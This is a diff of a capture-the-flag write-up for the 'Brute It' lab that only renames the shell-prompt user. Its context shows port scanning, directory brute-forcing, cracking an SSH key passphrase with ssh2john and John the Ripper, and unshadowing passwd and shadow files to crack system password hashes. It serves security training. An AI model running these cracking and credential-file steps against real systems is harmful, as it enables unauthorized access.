@@ -19,10 +19,10 @@ In this box you will learn about:
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/bruteit]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
 └─$ rustscan -a brute.thm -- -A 
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.56.229:22
@@ -47,7 +47,7 @@ PORT   STATE SERVICE REASON         VERSION
 We use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to find hidden directories :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/bruteit]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt  -u http://brute.thm  
 
 .htaccess            (Status: 403) [Size: 274]
@@ -78,7 +78,7 @@ So the password is `xavier` :
 We copy the key and use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) to make it john readable and crack it :
 
 ```bash
-──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/bruteit]
+──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
 └─$ ssh2john key > pass.hash 
 ```
 
@@ -87,7 +87,7 @@ We copy the key and use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.m
 Now we can use [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) to find the password :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/bruteit]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
 └─$ john pass.hash --wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -106,7 +106,7 @@ Session completed.
 We can make the key executable and use it on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) (username `john` it's in the [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md)) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/bruteit]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
 └─$ ssh -i key  john@brute.thm
 Enter passphrase for key 'key': 
 
@@ -219,13 +219,13 @@ john:x:1001:1001:john,,,:/home/john:/bin/bash
 Now we create the 2 files and use [Unshadow](../../3%20-%20Tags/Hacking%20Tools/Unshadow.md) to reveal the password :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/bruteit]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
 └─$ nano passwd     
 
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/bruteit]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
 └─$ nano shadow  
 
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/bruteit]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
 └─$ unshadow passwd shadow > crackpasswords
 
 ```
@@ -235,7 +235,7 @@ Now we create the 2 files and use [Unshadow](../../3%20-%20Tags/Hacking%20Tools/
 Now we need to run [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) on the created file and reveal the password :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/bruteit]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/bruteit]
 └─$ john crackpasswords --wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
 Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
